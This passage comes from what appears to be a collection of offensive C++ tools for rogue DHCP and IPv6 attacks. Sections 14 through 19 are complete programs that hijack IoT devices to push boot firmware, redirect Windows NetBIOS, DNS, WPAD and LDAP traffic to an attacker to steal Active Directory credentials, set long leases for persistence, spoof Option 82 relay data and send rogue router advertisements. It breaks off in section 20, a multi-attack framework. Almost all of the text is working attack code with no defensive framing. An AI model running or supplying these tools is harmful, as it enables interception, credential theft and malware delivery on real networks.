```

**Technique:** DHCP hijack targeting VoIP phones via Cisco Option 150 + Option 43. Redirects phones to attacker TFTP server for provisioning files — call interception, credential theft.

---

### 14. DHCP with Custom TFTP Boot (IOT Hijack)
```cpp
// Compile: g++ -o dhcp_iot dhcp_iot.cpp
// Run: sudo ./dhcp_iot <interface> <tftp_server_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPIoTHijack {
private:
    int sock;
    std::string tftpIP;
    
public:
    DHCPIoTHijack(const std::string& ip) : tftpIP(ip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendIoTOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP, tftpAddr;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, tftpIP.c_str(), &tftpAddr);
        *(uint32_t*)(packet + 20) = tftpAddr.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &tftpAddr.s_addr, 4); pos += 4;
        
        // TFTP server (option 66)
        packet[pos++] = 66;
        const char* tftpName = "iot-tftp";
        packet[pos++] = strlen(tftpName);
        memcpy(packet + pos, tftpName, strlen(tftpName));
        pos += strlen(tftpName);
        
        // Bootfile (option 67) - different for various IoT platforms
        // Could be firmware for ESP32, RPi, etc.
        const char* bootfile = "firmware.bin";
        packet[pos++] = 67;
        packet[pos++] = strlen(bootfile);
        memcpy(packet + pos, bootfile, strlen(bootfile));
        pos += strlen(bootfile);
        
        // Option 43: Vendor-specific for various IoT (MikroTik, etc.)
        std::vector<uint8_t> vendorOpts = {
            0x01, 0x04, 0xC0, 0xA8, 0x01, 0xFE,  // TFTP IP
        };
        packet[pos++] = 43;
        packet[pos++] = vendorOpts.size();
        memcpy(packet + pos, vendorOpts.data(), vendorOpts.size());
        pos += vendorOpts.size();
        
        // WPAD for IoT that support it
        std::string wpad = "http://" + tftpIP + "/wpad.dat";
        packet[pos++] = 252;
        packet[pos++] = wpad.length();
        memcpy(packet + pos, wpad.c_str(), wpad.length());
        pos += wpad.length();
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP IoT device hijack\n";
        std::cout << "[*] TFTP server: " << tftpIP << "\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                // Check for common IoT vendor OUIs
                uint8_t oui[3] = {buffer[28], buffer[29], buffer[30]};
                
                // Amazon (Echo), Google (Nest), Tuya, Shelly, ESP32
                bool isIoT = false;
                if ((oui[0] == 0x44 && oui[1] == 0x65) ||   // Amazon
                    (oui[0] == 0xF4 && oui[1] == 0xF5) ||   // Google
                    (oui[0] == 0x10 && oui[1] == 0x52) ||   // Tuya
                    (oui[0] == 0x84 && oui[1] == 0x0D) ||   // Espressif (ESP32)
                    (oui[0] == 0x3C && oui[1] == 0x71) ||   // Shelly
                    (oui[0] == 0x60 && oui[1] == 0x01)) {   // Common IoT
                    isIoT = true;
                }
                
                // Also check DHCP Option 60 (Vendor Class)
                int checkPos = 240;
                while (checkPos < bytes && buffer[checkPos] != 255) {
                    uint8_t code = buffer[checkPos];
                    uint8_t len = buffer[checkPos + 1];
                    if (code == 60) {
                        if (memmem(buffer + checkPos + 2, len, "IoT", 3) ||
                            memmem(buffer + checkPos + 2, len, "device", 6) ||
                            memmem(buffer + checkPos + 2, len, "esp", 3)) {
                            isIoT = true;
                        }
                    }
                    checkPos += 2 + len;
                }
                
                if (isIoT) {
                    uint32_t xid = *(uint32_t*)(buffer + 4);
                    uint8_t clientMAC[6];
                    memcpy(clientMAC, buffer + 28, 6);
                    
                    char macStr[18];
                    snprintf(macStr, sizeof(macStr),
                             "%02x:%02x:%02x:%02x:%02x:%02x",
                             clientMAC[0], clientMAC[1], clientMAC[2],
                             clientMAC[3], clientMAC[4], clientMAC[5]);
                    
                    std::cout << "[*] IoT device: " << macStr << " - hijacking\n";
                    sendIoTOffer(clientMAC, xid);
                }
            }
        }
    }
    
    ~DHCPIoTHijack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <tftp_server_ip>\n";
        return 1;
    }
    DHCPIoTHijack iot(argv[2]);
    iot.run();
    return 0;
}
```

**Technique:** DHCP IoT hijack targeting smart devices (Amazon, Google, Tuya, ESP32, Shelly) via vendor OUI detection + TFTP bootfile injection. Persistent malware delivery at device boot.

---

### 15. DHCP with SMB/NetBIOS Options (Windows Attack)
```cpp
// Compile: g++ -o dhcp_smb dhcp_smb.cpp
// Run: sudo ./dhcp_smb <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPSmbHijack {
private:
    int sock;
    
public:
    DHCPSmbHijack() {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendSmbOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // DNS = attacker
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Domain name (NetBIOS / AD domain)
        const char* domain = "CORP";
        packet[pos++] = 15;
        packet[pos++] = strlen(domain);
        memcpy(packet + pos, domain, strlen(domain));
        pos += strlen(domain);
        
        // NetBIOS name server (NBNS) - Option 44
        packet[pos++] = 44;
        packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // NetBIOS node type (Option 46) = 0x08 (Hybrid)
        packet[pos++] = 46;
        packet[pos++] = 1;
        packet[pos++] = 0x08;
        
        // NetBIOS scope (Option 47)
        const char* scope = "";
        packet[pos++] = 47;
        packet[pos++] = strlen(scope);
        pos += strlen(scope);
        
        // SMB over NetBIOS - domain
        // Option 118: Subnet selection
        packet[pos++] = 118;
        packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Custom option 252 for WPAD (helps SMB relay)
        std::string wpad = "http://192.168.1.254/wpad.dat";
        packet[pos++] = 252;
        packet[pos++] = wpad.length();
        memcpy(packet + pos, wpad.c_str(), wpad.length());
        pos += wpad.length();
        
        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP SMB/NetBIOS hijack for Windows\n";
        std::cout << "[*] Redirecting NBNS, WPAD, DNS to attacker\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                // Check for Windows - common vendor class "MSFT 5.0"
                int checkPos = 240;
                bool isWindows = false;
                while (checkPos < bytes && buffer[checkPos] != 255) {
                    uint8_t code = buffer[checkPos];
                    uint8_t len = buffer[checkPos + 1];
                    if (code == 60 && len >= 8) {
                        if (memcmp(buffer + checkPos + 2, "MSFT", 4) == 0 ||
                            memmem(buffer + checkPos + 2, len, "Windows", 7)) {
                            isWindows = true;
                        }
                    }
                    checkPos += 2 + len;
                }
                
                if (isWindows) {
                    uint32_t xid = *(uint32_t*)(buffer + 4);
                    uint8_t clientMAC[6];
                    memcpy(clientMAC, buffer + 28, 6);
                    
                    std::cout << "[*] Windows client - sending SMB hijack offer\n";
                    sendSmbOffer(clientMAC, xid);
                }
            }
        }
    }
    
    ~DHCPSmbHijack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    DHCPSmbHijack smb;
    smb.run();
    return 0;
}
```

**Technique:** DHCP + SMB/NetBIOS hijack for Windows. Redirects NBNS, DNS, WPAD, SMB lookups to attacker. Combined with Responder/tooling for full AD credential theft.

---

### 16. DHCP with Custom Lease Time (Persistence)
```cpp
// Compile: g++ -o dhcp_lease dhcp_lease.cpp
// Run: sudo ./dhcp_lease <interface> <lease_time_seconds>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPLeaseTimeAttack {
private:
    int sock;
    uint32_t leaseTime;
    
public:
    DHCPLeaseTimeAttack(uint32_t lt) : leaseTime(lt) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendLeaseOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Lease time (option 51) - VERY LONG = persistence
        packet[pos++] = 51;
        packet[pos++] = 4;
        *(uint32_t*)(packet + pos) = htonl(leaseTime);
        pos += 4;
        
        // Renewal time (option 58) - T1
        packet[pos++] = 58;
        packet[pos++] = 4;
        *(uint32_t*)(packet + pos) = htonl(leaseTime / 2);
        pos += 4;
        
        // Rebinding time (option 59) - T2
        packet[pos++] = 59;
        packet[pos++] = 4;
        *(uint32_t*)(packet + pos) = htonl(leaseTime * 7 / 8);
        pos += 4;
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP lease time attack: " << leaseTime 
                  << " seconds (" << (leaseTime / 86400) << " days)\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Sending long-lease offer\n";
                sendLeaseOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPLeaseTimeAttack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <lease_time_seconds>\n";
        return 1;
    }
    DHCPLeaseTimeAttack attack((uint32_t)atoi(argv[2]));
    attack.run();
    return 0;
}
```

**Technique:** DHCP with maximum lease time (e.g., 365 days). Client keeps malicious config permanently — no need to re-poison. Persistence attack combined with malicious gateway/DNS.

---

### 17. DHCP Relay Sub-Option Attack
```cpp
// Compile: g++ -o dhcp_relay dhcp_relay.cpp
// Run: sudo ./dhcp_relay <interface> <circuit_id>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPRelayAttack {
private:
    int sock;
    std::string circuitID;
    
public:
    DHCPRelayAttack(const std::string& cid) : circuitID(cid) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendRelayOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Option 82: Relay Agent Information
        // Sub-option 1: Circuit ID
        // Sub-option 2: Remote ID
        std::vector<uint8_t> relayInfo;
        
        relayInfo.push_back(1);  // Sub-option 1: Circuit ID
        relayInfo.push_back(circuitID.length());
        relayInfo.insert(relayInfo.end(), circuitID.begin(), circuitID.end());
        
        relayInfo.push_back(2);  // Sub-option 2: Remote ID
        const char* remoteID = "attacker-port-01";
        relayInfo.push_back(strlen(remoteID));
        relayInfo.insert(relayInfo.end(), remoteID, remoteID + strlen(remoteID));
        
        packet[pos++] = 82;
        packet[pos++] = relayInfo.size();
        memcpy(packet + pos, relayInfo.data(), relayInfo.size());
        pos += relayInfo.size();
        
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP relay sub-option attack\n";
        std::cout << "[*] Circuit ID: " << circuitID << "\n";
        std::cout << "[*] Sending spoofed Option 82 to confuse relay\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Sending relay spoofed offer\n";
                sendRelayOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPRelayAttack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <circuit_id>\n";
        return 1;
    }
    DHCPRelayAttack attack(argv[2]);
    attack.run();
    return 0;
}
```

**Technique:** DHCP Relay Agent Information (Option 82) attack — spoofs circuit ID/remote ID to confuse relay agents. Enables IP theft from another subnet/VLAN.

---

### 18. DHCP with IPv6 SLAAC + DHCPv6 Combo
```cpp
// Compile: g++ -o dhcp_v6combo dhcp_v6combo.cpp -lpthread
// Run: sudo ./dhcp_v6combo <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>

class DHCPv6ComboAttack {
private:
    std::string iface;
    
    void sendRouterAdvertisement() {
        int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
        if (sock < 0) return;
        
        // Build RA packet
        uint8_t packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct icmp6_hdr* icmp6 = (struct icmp6_hdr*)packet;
        icmp6->icmp6_type = ND_ROUTER_ADVERT;
        icmp6->icmp6_code = 0;
        icmp6->icmp6_cksum = 0;
        icmp6->icmp6_dataun.icmp6_un_data8[0] = 64;  // Cur hop limit
        icmp6->icmp6_dataun.icmp6_un_data8[1] = 0x80;  // Managed flag
        icmp6->icmp6_dataun.icmp6_un_data16[1] = htons(1800);  // Router lifetime
        
        int pos = sizeof(struct icmp6_hdr);
        
        // Source Link-Layer Address option
        packet[pos++] = 1;  // Type
        packet[pos++] = 1;  // Length
        // MAC placeholder
        packet[pos++] = 0x00; packet[pos++] = 0x11;
        packet[pos++] = 0x22; packet[pos++] = 0x33;
        packet[pos++] = 0x44; packet[pos++] = 0x55;
        
        // Prefix Information option
        packet[pos++] = 3;   // Type
        packet[pos++] = 4;   // Length
        packet[pos++] = 64;  // Prefix length
        packet[pos++] = 0xC0; // Flags: On-link + Autonomous
        packet[pos++] = 0; packet[pos++] = 0; packet[pos++] = 0; // Reserved
        *(uint32_t*)(packet + pos) = htonl(2592000); pos += 4;  // Valid lifetime
        *(uint32_t*)(packet + pos) = htonl(604800); pos += 4;   // Preferred lifetime
        *(uint32_t*)(packet + pos) = 0; pos += 4;               // Reserved
        // Prefix 2001:db8:evil::/64
        struct in6_addr prefix;
        inet_pton(AF_INET6, "2001:db8:dead:beef::", &prefix);
        memcpy(packet + pos, &prefix, 16);
        pos += 16;
        
        // RDNSS option (Recursive DNS Server)
        packet[pos++] = 25;  // Type
        packet[pos++] = 3;   // Length
        packet[pos++] = 0; packet[pos++] = 0;  // Reserved
        *(uint32_t*)(packet + pos) = htonl(3600); pos += 4;  // Lifetime
        // Attacker DNS IPv6
        struct in6_addr dns6;
        inet_pton(AF_INET6, "2001:db8:dead:beef::1", &dns6);
        memcpy(packet + pos, &dns6, 16);
        pos += 16;
        
        // Destination: ff02::1 (all nodes)
        struct sockaddr_in6 dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin6_family = AF_INET6;
        inet_pton(AF_INET6, "ff02::1", &dest.sin6_addr);
        dest.sin6_scope_id = if_nametoindex(iface.c_str());
        
        sendto(sock, packet, pos, 0, 
               (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void sendDHCPv6Advertise() {
        int sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) return;
        
        // Would need to bind to [ff02::1:2]:547
        // Simplified - just show concept
        close(sock);
    }
    
public:
    DHCPv6ComboAttack(const std::string& i) : iface(i) {}
    
    void run() {
        std::cout << "[*] DHCPv6 + SLAAC combo attack\n";
        std::cout << "[*] Sending Router Advertisement with malicious prefix/DNS\n";
        
        while (true) {
            sendRouterAdvertisement();
            usleep(3000000);  // Every 3 seconds
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    DHCPv6ComboAttack attack(argv[1]);
    attack.run();
    return 0;
}
```

**Technique:** Combined DHCPv6 + IPv6 SLAAC attack. Sends Router Advertisements with malicious prefix + DNS (RDNSS option). Affects all IPv6-enabled hosts on LAN regardless of DHCPv4 state.

---

### 19. DHCP with Domain Controller Redirect
```cpp
// Compile: g++ -o dhcp_dc dhcp_dc.cpp
// Run: sudo ./dhcp_dc <interface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DHCPDCRedirect {
private:
    int sock;
    
public:
    DHCPDCRedirect() {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void sendDCOffer(const uint8_t* clientMAC, uint32_t xid) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, "192.168.1.254", &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Domain name (option 15)
        const char* domain = "corp.local";
        packet[pos++] = 15;
        packet[pos++] = strlen(domain);
        memcpy(packet + pos, domain, strlen(domain));
        pos += strlen(domain);
        
        // Domain Search List (option 119)
        std::vector<uint8_t> searchList;
        const char* domains[] = {"corp.local", "internal.corp"};
        for (const char* d : domains) {
            std::string s(d);
            size_t start = 0, dot;
            while ((dot = s.find('.', start)) != std::string::npos) {
                uint8_t len = dot - start;
                searchList.push_back(len);
                searchList.insert(searchList.end(), 
                                  s.begin() + start, s.begin() + dot);
                start = dot + 1;
            }
            uint8_t len = s.length() - start;
            searchList.push_back(len);
            searchList.insert(searchList.end(),
                              s.begin() + start, s.end());
            searchList.push_back(0);
        }
        
        packet[pos++] = 119;
        packet[pos++] = searchList.size();
        memcpy(packet + pos, searchList.data(), searchList.size());
        pos += searchList.size();
        
        // NetBIOS over TCP/IP Name Server (option 44)
        packet[pos++] = 44;
        packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // NetBIOS Node Type (option 46) = 8 (Hybrid)
        packet[pos++] = 46;
        packet[pos++] = 1;
        packet[pos++] = 8;
        
        // LDAP server (option 95)
        packet[pos++] = 95;
        packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void run() {
        std::cout << "[*] DHCP Domain Controller redirect attack\n";
        std::cout << "[*] Redirecting corp.local DC to attacker\n";
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] == 1 && buffer[240] == 53 && buffer[242] == 1) {
                uint32_t xid = *(uint32_t*)(buffer + 4);
                uint8_t clientMAC[6];
                memcpy(clientMAC, buffer + 28, 6);
                
                std::cout << "[*] Sending DC-hijacked offer\n";
                sendDCOffer(clientMAC, xid);
            }
        }
    }
    
    ~DHCPDCRedirect() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>\n";
        return 1;
    }
    DHCPDCRedirect attack;
    attack.run();
    return 0;
}
```

**Technique:** Domain Controller redirect via DHCP Options 15, 119, 44, 95. Redirects Windows AD authentication, NetBIOS lookups, LDAP queries to attacker. Full AD takeover preparation.

---

### 20. DHCP Framework with Auto-Detection + Multi-Attack Chain
```cpp
// Compile: g++ -o dhcp_framework dhcp_framework.cpp -lpthread
// Run: sudo ./dhcp_framework <interface> <attacker_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>
#include <map>

class DHCPFramework {
private:
    int sock;
    std::string iface, attackerIP;
    std::atomic<bool> running{false};
    std::map<std::string, int> deviceStats;
    
